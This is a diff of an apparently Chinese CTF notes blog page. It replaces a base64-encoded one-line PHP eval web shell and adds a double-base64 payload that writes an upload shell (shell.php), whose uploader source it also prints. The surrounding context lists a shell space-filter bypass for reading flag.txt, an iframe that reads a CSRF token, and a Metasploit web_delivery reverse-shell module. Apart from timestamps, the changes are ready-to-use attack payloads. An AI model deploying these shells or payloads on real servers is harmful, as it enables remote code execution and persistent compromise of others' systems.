@@ -103,7 +103,7 @@
 <meta property="og:site_name" content="Emerald Dream">
 <meta property="og:description" content="CTF流程1.查看源代码2.查看robots.txt linux下空格绕过1234cat flag.txtcat$&amp;#123;IFS&amp;#125;flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-06-23T12:35:07.089Z">
+<meta property="og:updated_time" content="2019-06-29T14:11:30.545Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;Notes&#39;">
 <meta name="twitter:description" content="CTF流程1.查看源代码2.查看robots.txt linux下空格绕过1234cat flag.txtcat$&amp;#123;IFS&amp;#125;flag.txtcat$IFS$9flag.txtcat&amp;lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value">
@@ -356,7 +356,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-06-23 20:35:07" itemprop="dateModified" datetime="2019-06-23T20:35:07+08:00">2019-06-23</time>
+                <time title="Modified: 2019-06-29 22:11:30" itemprop="dateModified" datetime="2019-06-29T22:11:30+08:00">2019-06-29</time>
               
             
           </span>
@@ -428,7 +428,10 @@
 <p>获取usertoken</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot;onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;</span><br></pre></td></tr></table></figure>
 <h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>写一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo `echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pPz4=|base64 -d &gt; upload/1.php` ;?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo `echo PD9waHAgQGV2YWwoJF9QT1NUWydXaW5keSddKT8+|base64 -d &gt; upload/1.php` ;?&gt;</span><br></pre></td></tr></table></figure>
+<p>一句话写上传马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@$temp = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">@$file = basename($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">if (empty ($file))&#123;</span><br><span class="line">echo &quot;&lt;form action = &apos;&apos; method = &apos;POST&apos; ENCTYPE=&apos;multipart/form-data&apos;&gt;\n&quot;;echo &quot;Local file: &lt;input type = &apos;file&apos; name = &apos;upload_file&apos;&gt;\n&quot;;echo &quot;&lt;input type = &apos;submit&apos; value = &apos;Upload&apos;&gt;\n&quot;;echo &quot;&lt;/form&gt;\n&lt;pre&gt;\n\n&lt;/pre&gt;&quot;;&#125;else &#123;if(move_uploaded_file($temp,$file))&#123;echo &quot;File uploaded successfully.&lt;p&gt;\n&quot;;&#125;else &#123;echo &quot;Unable to upload &quot; . $file . &quot;.&lt;p&gt;\n&quot;;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
 <h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>反弹shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure>
 <h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>命令行导入数据库</p>
